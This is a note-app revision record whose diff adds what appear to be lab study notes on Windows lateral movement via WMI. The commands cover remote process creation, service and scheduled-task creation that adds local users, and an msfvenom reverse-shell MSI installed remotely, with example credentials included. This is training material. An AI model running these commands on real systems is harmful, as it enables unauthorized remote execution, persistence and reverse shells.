id: 9ade66dde7c14b9eb95aaef8567cef55
parent_id: 0b842a4e8eb14e98b8b6e0e83f1a29cd
item_type: 1
item_id: 155e394b578a4f6287b9927a325c5eaa
item_updated_time: 1658222951336
title_diff: "[]"
body_diff: "[{\"diffs\":[[0,\"orts 135\"],[1,\" (RPC)\"],[0,\", 5985/5\"]],\"start1\":704,\"start2\":704,\"length1\":16,\"length2\":22},{\"diffs\":[[0,\"P/HTTPS)\"],[1,\", and Administrator\\\n\\\nDone by sending a WMI request to the Win32_Process class to spawn the process under the session we created before\\\n\\\n`$Command = \\\"powershell.exe -Command Set-Content -Path C:\\\\text.txt -Value munrawashere\\\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }`\\\n\\\nThere will be no output printed out after running. If the machine does not have powershell, we can do the same with **wmic.exe**\\\n\\\n`wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create \\\"cmd.exe /c payload.exe\\\"`\\\n\\\n# Remote Service Creation (WMI)\\\n\\\nRequires Ports 135, 5985/5986 (WinRM HTTP/HTTPS), and Administrator\\\n\\\nMethod to create a service\\\n\\\n`Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = \\\"THMService2\\\"; DisplayName = \\\"THMService2\\\"; PathName = \\\"net user munra2 Pass123 /add\\\"; # Your payload ServiceType = [byte]::Parse(\\\"16\\\"); # Win32OwnProcess : Start service in a new process StartMode = \\\"Manual\\\" }`\\\n\\\nWe can then start the service by getting a handle on it\\\n\\\n`$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter \\\"Name LIKE 'THMService2'\\\" Invoke-CimMethod -InputObject $Service -MethodName StartService`\\\n\\\nWe can control whether to stop or delete the service too\\\n\\\n`Invoke-CimMethod -InputObject $Service -MethodName StopService Invoke-CimMethod -InputObject $Service -MethodName Delete`\\\n\\\n# Create Scheduled Tasks Remotely (WMI)\\\n\\\nRequires Ports 135 (RPC), 5985/5986 (WinRM HTTP/HTTPS), and Administrator\\\n\\\nCreation of scheduled tasks\\\n\\\n`# Payload must be split in Command and Args`\\\n\\\n`$Command = \\\"cmd.exe\\\"`\\\n\\\n`$Args = \\\"/c net user munra22 aSdf1234 /add\\\"`\\\n\\\n`$Action = New-ScheduledTaskAction -CimSession`\\\n\\\n`$Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User \\\"NT AUTHORITY\\\\SYSTEM\\\" -TaskName \\\"THMtask2\\\" Start-ScheduledTask -CimSession $Session -TaskName \\\"THMtask2\\\"`\\\n\\\nDeletion of scheduled tasks\\\n\\\n`Unregister-ScheduledTask -CimSession $Session -TaskName \\\"THMtask2\\\"`\\\n\\\n# Install MSI Packages (WMI)\\\n\\\nRequires Ports 135 (RPC), 5985/5986 (WinRM HTTP/HTTPS), and Administrator\\\n\\\nPayload can be generated through msfvenom\\\n\\\n> msfvenom -p windows/shell\\\\_reverse\\\\_tcp LHOST=10.x.x.x LPORT=4444 –f msi > install.msi\\\n\\\nMethod to launch the msi file in Powershell\\\n\\\n> `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = \\\"C:\\\\Windows\\\\myinstaller.msi\\\"; Options = \\\"\\\"; AllUsers = $false}`\\\n\\\nIf legacy, can use **wmic.exe**\\\n\\\n> `wmic /node:TARGET /user:DOMAIN\\\\USER product call install PackageLocation=c:\\\\Windows\\\\myinstaller.msi`\"]],\"start1\":740,\"start2\":740,\"length1\":8,\"length2\":2685}]"
metadata_diff: {"new":{},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-07-19T09:37:16.134Z
created_time: 2022-07-19T09:37:16.134Z
type_: 13